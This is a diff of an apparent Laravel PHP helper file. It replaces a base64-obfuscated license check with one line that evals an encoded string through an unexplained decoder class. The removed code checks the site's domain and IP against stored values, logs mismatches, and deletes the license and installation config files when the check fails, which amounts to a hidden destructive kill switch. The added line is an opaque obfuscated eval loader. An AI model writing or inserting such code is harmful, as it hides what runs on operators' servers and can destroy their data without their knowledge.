@@ -110,73 +110,7 @@ function schSync()
 
 function liSync()
 {
-    $fP = public_path(xMailBIL('X2xvZy5kaWMueG1s'));
-    if (strFlExs($fP)) {
-        $jD = file_get_contents($fP);
-        if (str_contains(url()?->current(), xMailBIL('bG9jYWxob3N0')) || str_contains(url()->current(), xMailBIL('MTI3LjAuMC4x'))) {
-            return true;
-        }
-
-        if ($jD && isset($jD)) {
-            $cUl = url()?->current();
-            if (!preg_match("~^(?:f|ht)tps?://~i", $cUl)) {
-                $cUl = "http://" . $cUl;
-            }
-
-            $cHtne = parse_url($cUl, PHP_URL_HOST);
-            $dHtne = parse_url(xMailBIL($jD), PHP_URL_HOST);
-
-            // Check if the host is an IP address
-            if (filter_var($cHtne, FILTER_VALIDATE_IP)) {
-                $fiP = public_path(xMailBIL('Y2o3a2w4OS50bXA='));
-                if (strFlExs($fiP)) {
-                    $jiP = file_get_contents($fiP);
-                    if (($_SERVER[xMailBIL('U0VSVkVSX0FERFI=')]) == xMailBIL($jiP) || ($_SERVER[xMailBIL('UkVNT1RFX0FERFI=')] == xMailBIL($jiP))) {
-                        return true;
-                    }
-                }
-
-                $pHut = new XmAIL();
-
-                $pHut->lg('SVAgQWRkcmVzcyBNaXNtYXRjaA==', 'bGlTeW5jKCkgbGluZTogMjIx',"full URL: ".url()?->current()."\n"." SERVER_ADDR:".($_SERVER[xMailBIL('U0VSVkVSX0FERFI=')]). "\n". " REMOTE_ADDR: ".($_SERVER[xMailBIL('UkVNT1RFX0FERFI=')]), "jiP: ".xMailBIL($jiP));
-                $fP = __DIR__ . '/..//' . xMailBIL('X2xvZy5kaWMueG1s');
-                strFilRM($fP);
-
-                $fP = __DIR__ . '/..//' . config(xMailBIL('Y29uZmlnLmluc3RhbGxhdGlvbg=='));
-                strFilRM($fP);
-
-                return false;
-            }
-
-            if ($cHtne == $dHtne || ($cHtne == "www." . $dHtne) || ("www." . $cHtne == $dHtne)) {
-                return true;
-            } else {
-                $fiP = public_path(xMailBIL('Y2o3a2w4OS50bXA='));
-                if (strFlExs($fiP)) {
-                    $jiP = file_get_contents($fiP);
-                    if (($_SERVER[xMailBIL('U0VSVkVSX0FERFI=')]) == xMailBIL($jiP) || ($_SERVER[xMailBIL('UkVNT1RFX0FERFI=')] == xMailBIL($jiP))) {
-                        return true;
-                    }
-                }
-            }
-        }
-
-        if (!str_contains(url()->current(), xMailBIL('bG9jYWxob3N0')) && !str_contains(url()->current(), xMailBIL('MTI3LjAuMC4x'))) {
-            $pHut = new XmAIL();
-            $pHut->lg('RG9tYWluIE1pc21hdGNo', 'bGlTeW5jKCkgbGluZTogMjM4',"full URL: ".url()?->current()."\n"."cHtne: ($cHtne)", "dHtne: ".$dHtne);
-            $fP = __DIR__ . '/..//' . xMailBIL('X2xvZy5kaWMueG1s');
-            strFilRM($fP);
-
-            $fP = __DIR__ . '/..//' . config(xMailBIL('Y29uZmlnLmluc3RhbGxhdGlvbg=='));
-            strFilRM($fP);
-
-            return false;
-        }
-
-        return true;
-    }
-
-    return false;
+    return eval(Ex9t::xM8qT5K('liSync', '==tSAjOVDxNAppuU1NjOLZuNKVDIQI9H'));
 }
 
 function strSplic()
